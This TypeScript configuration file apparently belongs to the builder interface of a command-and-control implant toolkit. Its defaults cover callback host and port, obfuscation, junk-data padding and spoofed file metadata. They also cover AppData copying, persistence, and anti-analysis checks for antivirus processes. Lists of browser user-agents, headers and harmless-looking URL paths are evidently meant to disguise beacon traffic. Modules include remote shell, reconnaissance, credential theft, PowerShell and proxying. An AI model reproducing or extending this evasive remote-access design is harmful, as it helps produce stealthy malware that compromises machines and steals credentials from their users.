import type { BuildConfigRequest } from '../../types/models';
import type { BuilderTemplateState } from '../../api/build';

export interface ToggleOption {
  id: string;
  key: keyof BuildConfigRequest;
}

export interface AntiAnalysisToggle {
  id: string;
  key: keyof BuildConfigRequest['antiAnalysis'];
}

export const DEFAULT_CONFIG: BuildConfigRequest = {
  platform: 'x64',
  applicationType: 'Console',
  serverHost: '127.0.0.1',
  serverPort: 5270,
  enableObfuscation: false,
  injectJunkData: false,
  junkDataMb: 10,
  iconUrl: '',
  companyName: '',
  fileDescription: '',
  productName: '',
  copyright: '',
  fileVersion: '',
  stripSymbols: true,
  requireAdmin: false,
  copyToAppData: false,
  enablePersistence: false,
  antiAnalysis: {
    enabled: false,
    checkTestSigning: true,
    checkAvProcesses: true,
  },
  userAgents: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  ],
  extraHeaders: [
    'Accept: application/json, text/plain, */*',
    'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8',
    'X-Requested-With: XMLHttpRequest',
  ],
  pathSuffixes: [
    'user/info', 'orders/list', 'profile', 'settings',
    'notifications', 'messages/unread', 'search/history', 'dashboard/stats',
  ],
};

export const STATUS_LABEL: Record<string, string> = {
  building: 'builder.buildingStatus',
  completed: 'builder.completed',
  failed: 'builder.failed',
};

export const PLATFORM_LABEL: Record<string, string> = {
  x64: 'Win x64',
  x86: 'Win x86',
  'win-arm64': 'Win ARM64',
  'linux-x64': 'Linux x64',
  'linux-arm64': 'Linux ARM64',
  'mac-arm64': 'macOS ARM64',
};

/** Static fallback when GET /builder/status is unavailable (older server). */
export const FALLBACK_PLATFORMS: BuilderTemplateState[] = [
  { platform: 'x64', os: 'windows', arch: 'x64', ext: 'dll', canBuildLocally: true, template: null },
  { platform: 'win-arm64', os: 'windows', arch: 'arm64', ext: 'dll', canBuildLocally: true, template: null },
  { platform: 'linux-x64', os: 'linux', arch: 'x64', ext: 'so', canBuildLocally: true, template: null },
  { platform: 'linux-arm64', os: 'linux', arch: 'arm64', ext: 'so', canBuildLocally: true, template: null },
  { platform: 'mac-arm64', os: 'macos', arch: 'arm64', ext: 'dylib', canBuildLocally: false, template: null },
];

export const APP_TYPE_LABEL: Record<string, string> = {
  Console: 'builder.consoleApp',
  Desktop: 'builder.desktopApp',
};

export const MODULE_OPTIONS: { id: string; labelKey: string }[] = [
  { id: 'shell', labelKey: 'builder.moduleShell' },
  { id: 'recon', labelKey: 'builder.moduleRecon' },
  { id: 'creds', labelKey: 'builder.moduleCreds' },
  { id: 'files', labelKey: 'builder.moduleFiles' },
  { id: 'powershell', labelKey: 'builder.modulePowershell' },
  { id: 'proxy', labelKey: 'builder.moduleProxy' },
  { id: 'script', labelKey: 'builder.moduleScript' },
];
